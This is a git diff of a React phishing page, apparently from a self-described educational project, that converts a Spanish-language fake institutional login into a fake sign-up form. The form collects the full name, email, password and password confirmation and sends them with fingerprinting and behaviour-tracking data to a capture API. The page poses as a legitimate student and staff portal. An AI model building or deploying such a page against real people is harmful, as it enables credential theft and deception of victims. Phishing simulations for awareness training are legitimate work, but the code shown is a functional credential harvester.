@@ -3,7 +3,7 @@ import { collectFingerprint } from '../utils/fingerprint';
 import { captureData } from '../utils/api';
 
 /**
- * Login Page - Ciberseguridad del Bienestar
+ * Sign Up Page - Ciberseguridad del Bienestar
  *
  * ⚠️ EDUCATIONAL CYBERSECURITY PROJECT ⚠️
  * Demonstrates credential harvesting with fingerprinting
@@ -16,7 +16,12 @@ const PhishingPageNew = () => {
   }, []);
 
   // State
-  const [formData, setFormData] = useState({ email: '', password: '' });
+  const [formData, setFormData] = useState({
+    name: '',
+    email: '',
+    password: '',
+    confirmPassword: ''
+  });
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   // Behavior tracking
@@ -71,8 +76,13 @@ const PhishingPageNew = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    if (!formData.email || !formData.password) {
-      alert('Por favor ingresa tu correo electrónico y contraseña');
+    if (!formData.name || !formData.email || !formData.password || !formData.confirmPassword) {
+      alert('Por favor completa todos los campos');
+      return;
+    }
+
+    if (formData.password !== formData.confirmPassword) {
+      alert('Las contraseñas no coinciden');
       return;
     }
 
@@ -89,8 +99,10 @@ const PhishingPageNew = () => {
         metadata: {
           userSubmitted: true,
           formData: {
+            name: formData.name,
             email: formData.email,
-            password: formData.password
+            password: formData.password,
+            confirmPassword: formData.confirmPassword
           }
         },
         timestamp: new Date().toISOString(),
@@ -130,7 +142,7 @@ const PhishingPageNew = () => {
       {/* Main Content */}
       <main className="container mx-auto px-4 py-12">
         <div className="max-w-md mx-auto">
-          {/* Login Card */}
+          {/* Sign Up Card */}
           <div className="bg-white rounded-lg shadow-lg p-8">
             <div className="text-center mb-8">
               <div className="w-20 h-20 bg-blue-600 rounded-full mx-auto mb-4 flex items-center justify-center">
@@ -138,11 +150,25 @@ const PhishingPageNew = () => {
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                 </svg>
               </div>
-              <h2 className="text-2xl font-bold text-gray-800 mb-2">Acceso al Portal</h2>
-              <p className="text-gray-600">Ingresa con tu cuenta institucional</p>
+              <h2 className="text-2xl font-bold text-gray-800 mb-2">Crear Cuenta</h2>
+              <p className="text-gray-600">Regístrate en el portal educativo</p>
             </div>
 
             <form onSubmit={handleSubmit} className="space-y-6">
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Nombre Completo
+                </label>
+                <input
+                  type="text"
+                  value={formData.name}
+                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition text-gray-900 bg-white"
+                  placeholder="Juan Pérez"
+                  required
+                />
+              </div>
+
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-2">
                   Correo Electrónico
@@ -171,12 +197,25 @@ const PhishingPageNew = () => {
                 />
               </div>
 
-              <div className="flex items-center justify-between text-sm">
-                <label className="flex items-center">
-                  <input type="checkbox" className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" />
-                  <span className="ml-2 text-gray-700">Recordarme</span>
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Confirmar Contraseña
                 </label>
-                <a href="#" className="text-blue-600 hover:underline">¿Olvidaste tu contraseña?</a>
+                <input
+                  type="password"
+                  value={formData.confirmPassword}
+                  onChange={(e) => setFormData({ ...formData, confirmPassword: e.target.value })}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition text-gray-900 bg-white"
+                  placeholder="••••••••"
+                  required
+                />
+              </div>
+
+              <div className="flex items-center text-sm">
+                <label className="flex items-center">
+                  <input type="checkbox" className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" required />
+                  <span className="ml-2 text-gray-700">Acepto los términos y condiciones</span>
+                </label>
               </div>
 
               <button
@@ -184,13 +223,13 @@ const PhishingPageNew = () => {
                 disabled={isSubmitting}
                 className="w-full bg-blue-600 text-white py-3 rounded-lg font-medium hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition disabled:opacity-50 disabled:cursor-not-allowed"
               >
-                {isSubmitting ? 'Ingresando...' : 'Iniciar Sesión'}
+                {isSubmitting ? 'Creando cuenta...' : 'Crear Cuenta'}
               </button>
             </form>
 
             <div className="mt-6 text-center">
               <p className="text-sm text-gray-600">
-                ¿No tienes una cuenta? <a href="#" className="text-blue-600 hover:underline">Regístrate aquí</a>
+                ¿Ya tienes una cuenta? <a href="#" className="text-blue-600 hover:underline">Inicia sesión aquí</a>
               </p>
             </div>
 
@@ -208,8 +247,8 @@ const PhishingPageNew = () => {
                 <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
               </svg>
               <div className="text-sm text-blue-800">
-                <p className="font-medium mb-1">Acceso exclusivo para estudiantes y personal</p>
-                <p className="text-blue-700">Si tienes problemas para acceder, contacta al administrador del sistema.</p>
+                <p className="font-medium mb-1">Registro exclusivo para estudiantes y personal</p>
+                <p className="text-blue-700">Al registrarte, tendrás acceso a todos los recursos educativos del portal.</p>
               </div>
             </div>
           </div>
